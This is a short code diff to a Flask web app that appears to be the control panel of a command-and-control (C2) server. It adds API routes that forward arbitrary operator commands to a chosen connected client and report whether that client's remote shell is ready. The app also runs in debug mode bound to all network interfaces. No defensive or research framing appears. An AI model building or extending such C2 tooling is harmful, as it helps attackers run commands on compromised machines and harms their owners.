@@ -72,5 +72,17 @@ def kill_connection(client_id):
     flash(result)
     return redirect(url_for("index"))
 
+@app.route("/api/send_command", methods=["POST"])
+def api_send_command():
+    cid = int(request.form["client_id"])
+    cmd = request.form["command"]
+    result = c2_server_logic.send_message(cid, cmd)
+    return {"result": result}
+
+@app.route("/api/shell_ready/<int:client_id>")
+def api_shell_ready(client_id):
+    from c2_server_logic import shell_ready
+    return {"ready": bool(shell_ready.get(client_id, False))}
+
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=5000)
